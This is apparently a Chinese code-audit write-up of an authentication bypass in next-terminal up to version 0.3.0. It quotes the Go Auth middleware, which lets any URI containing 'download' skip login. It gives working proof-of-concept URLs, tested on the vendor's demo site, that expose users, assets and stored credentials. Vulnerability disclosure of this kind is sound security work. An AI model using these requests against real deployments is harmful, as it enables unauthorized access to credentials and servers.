```json
{
  "date": "2021.03.10 11:49",
  "tags": ["golang","权限绕过","next-terminal","代码审计"],
  "description":"go代码审计-next-terminal权限绕过"
}
```

# next-terminal 代码审计

项目地址：

https://github.com/dushixiang/next-terminal

危害版本：
`<=0.3.0`


### 0x0 环境搭建

运行项目
`docker run -d   -p 8088:8088   --name next-terminal   --restart always dushixiang/next-terminal:latest`



### 0x1 权限绕过

代码分析：

pkg/api/routes.go:37行加载`Auth`认证

![image-20210305125205180](https://files.funcloud.net/uploads/ed759ef5a1d6c7cbb59c87f21ed404e0)



跟进`Auth`函数

pkg/api/middleware.go:28 

![](https://files.funcloud.net/uploads/1bb11e4eb80ac4a0060c5ec859d1dab7)

```go
func Auth(next echo.HandlerFunc) echo.HandlerFunc {

	urls := []string{"download", "recording", "login", "static", "favicon", "logo", "asciinema"}
	// 这里是为了给不需要认证的路由提供便利
	return func(c echo.Context) error {
		// 路由拦截 - 登录身份、资源权限判断等
		for i := range urls {
			if c.Request().RequestURI == "/" || strings.HasPrefix(c.Request().RequestURI, "/#") {
				return next(c)
			}
			if strings.Contains(c.Request().RequestURI, urls[i]) { //  路由中携带urls中的关键字
        
				return next(c) //?download=suanve 实现权限绕过
        
			}
		}

		token := GetToken(c)
		cacheKey := strings.Join([]string{Token, token}, ":")
		authorization, found := global.Cache.Get(cacheKey)
		if !found {
			return Fail(c, 401, "您的登录信息已失效，请重新登录后再试。")
		}
```



#### 0x3 官网demo实测：

##### 获取用户列表

https://next-terminal.typesafe.cn/users/paging?download=suanve

![image-20210305124955423](https://files.funcloud.net/uploads/487f129108c7b95560ec74995ea417e7)



##### 获取资产

https://next-terminal.typesafe.cn/assets/paging?pageIndex=1&pageSize=10&protocol=&download=suanve

![image-20210305130107255](https://files.funcloud.net/uploads/159207df1e6df8cd5b3c6d0fc57ecf55)



##### 获取凭据

https://next-terminal.typesafe.cn/credentials/paging?pageIndex=1&pageSize=10&download=suanve

![image-20210305130436581](https://files.funcloud.net/uploads/b4eddda35142e99069b3494eda4929f1)

